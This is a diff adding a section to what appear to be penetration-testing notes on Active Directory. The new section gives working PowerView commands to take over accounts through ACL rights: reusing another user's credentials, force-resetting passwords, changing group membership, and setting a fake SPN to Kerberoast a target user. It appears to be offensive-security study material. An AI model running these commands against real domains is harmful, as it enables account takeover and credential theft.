@@ -55,3 +55,43 @@ If a group is nested in another group, any users in the sub-group will obtain th
 ```PowerShell
 Get-DomainGroup -Identity "<group_name>" | select memberof
 ```
+
+## Useful ACL Abuse Processes
+### Creating a PSCredential Object for another user
+If we aren't logged in as another user, then we can use PSCredential objects to use them as a context for a PowerShell session
+```PowerShell
+$SecPassword = ConvertTo-SecureString '[pass]' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('[domain]/[user]', $SecPassword)
+```
+
+### Force change another user's password
+```PowerShell
+# Create a SecureString object that will house the new password
+$NewPassword = ConvertTo-SecureString '[new_pass]' -AsPlainText -Force
+
+# Force change the user's password with PowerView
+# We use the $Cred variable from above to use another user's context (this is optional if we are already logged in as that user)
+Import-Module .\PowerView.ps1
+Set-DomainUserPassword -Identity [user] -AccountPassword $NewPassword -Credential $Cred -Verbose
+```
+
+### Add a user to a group
+```PowerShell
+# You can view all members of a group with this
+Get-ADGroup -Identity "[group]" -Properties * | Select -ExpandProperty Members
+
+# Add a user
+Add-DomainGroupMember -Identity '[group]' -Members '[user]' -Credential $UserPSCredential -Verbose
+
+# Remove a user
+Remove-DomainGroupMember -Identity '[group]' -Members '[user]' -Credential $UserPSCredential -Verbose
+```
+
+### Updating a domain object
+If we have permission to write to another user eg. `GenericAll`, then we can add a temporary fake SPN to a user, [[Kerberoasting|Kerberoast]] them, and potentially crack their password. This is useful as it means we aren't changing passwords and therefore potentially causing disruption.
+```PowerShell
+Set-DomainObject -Credential $Cred -Identity [target_user] -SET @{serviceprinciplename='temporary/PENTEST'} -Verbose
+
+# We should also clean up the changed SPN
+Set-DomainObject -Credential $Cred -Identity [target_user] -Clear serviceprinciplename -Verbose
+```
